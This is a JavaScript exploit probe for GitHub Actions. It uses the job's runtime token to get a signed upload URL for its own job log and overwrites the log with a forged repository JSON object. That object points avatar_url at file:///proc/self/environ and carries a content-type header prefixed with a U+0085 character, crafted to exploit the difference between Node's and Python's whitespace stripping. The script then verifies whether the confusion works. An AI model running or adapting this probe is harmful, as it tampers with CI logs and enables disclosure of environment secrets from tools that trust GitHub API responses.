const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const resultsUrl = process.env.ACTIONS_RESULTS_URL;
const githubToken = process.env.GITHUB_TOKEN;
const repository = process.env.GITHUB_REPOSITORY;
const runId = process.env.GITHUB_RUN_ID;
if (!runtimeToken || !resultsUrl || !githubToken || !repository || !runId) {
  throw new Error('Missing GitHub Actions runtime configuration');
}
const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url').toString());
const scope = claims.scp.split(' ').find(part => part.startsWith('Actions.Results:'));
if (!scope) throw new Error('Actions.Results scope unavailable');
const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');

const jobsResponse = await fetch(
  `https://api.github.com/repos/${repository}/actions/runs/${runId}/jobs`,
  {headers: {
    authorization: `Bearer ${githubToken}`,
    accept: 'application/vnd.github+json',
    'x-github-api-version': '2022-11-28',
    'user-agent': 'repo-cassette-log-probe',
  }},
);
if (!jobsResponse.ok) throw new Error(`list jobs: ${jobsResponse.status}`);
const jobs = (await jobsResponse.json()).jobs;
const current = jobs.find(job => job.status === 'in_progress' && job.name === 'probe')
  || jobs.find(job => job.status === 'in_progress');
if (!current) throw new Error('Current REST job ID unavailable');

const signedResponse = await fetch(
  new URL('/twirp/results.services.receiver.Receiver/GetJobLogsSignedBlobURL', resultsUrl),
  {
    method: 'POST',
    headers: {authorization: `Bearer ${runtimeToken}`, 'content-type': 'application/json'},
    body: JSON.stringify({
      workflow_run_backend_id: workflowRunBackendId,
      workflow_job_run_backend_id: workflowJobRunBackendId,
    }),
  },
);
const signedText = await signedResponse.text();
if (!signedResponse.ok) {
  throw new Error(`signed log URL: ${signedResponse.status} ${signedText.slice(0, 200)}`);
}
const signed = JSON.parse(signedText);

const repositoryPath = `${repository}/actions/jobs/${current.id}/logs`;
const payload = Buffer.from(JSON.stringify({
  full_name: repositoryPath,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Self-referential Actions log probe',
  stargazers_count: 0,
}));
const uploadResponse = await fetch(signed.logs_url, {
  method: 'PUT',
  headers: {
    'x-ms-version': '2022-11-02',
    'x-ms-blob-type': 'BlockBlob',
    'x-ms-blob-content-type': '\u0085application/json',
    'content-type': 'application/octet-stream',
    'content-length': String(payload.length),
  },
  body: payload,
});
if (!uploadResponse.ok) {
  throw new Error(`log overwrite: ${uploadResponse.status} ${(await uploadResponse.text()).slice(0, 200)}`);
}

const sampleResponse = await fetch(`https://api.github.com/repos/${repositoryPath}`, {
  headers: {
    authorization: `Bearer ${githubToken}`,
    accept: 'application/vnd.github+json',
    'x-github-api-version': '2022-11-28',
    'user-agent': 'repo-cassette-log-probe',
  },
});
const sample = Buffer.from(await sampleResponse.arrayBuffer());
const contentType = sampleResponse.headers.get('content-type') || '';
const head = contentType.split(',', 1)[0].split(';', 1)[0].toLowerCase();
const nodeType = head.trim();
const pythonType = head.replace(/^[\s\u0085]+|[\s\u0085]+$/gu, '');
console.log('LOG-PROBE', JSON.stringify({
  jobId: current.id,
  uploadStatus: uploadResponse.status,
  sampleStatus: sampleResponse.status,
  contentTypeHex: Buffer.from(contentType, 'latin1').toString('hex'),
  bytes: sample.length,
  bodyMatch: sample.equals(payload),
  candidate: sample.equals(payload) && nodeType !== 'application/json' && pythonType === 'application/json',
}));
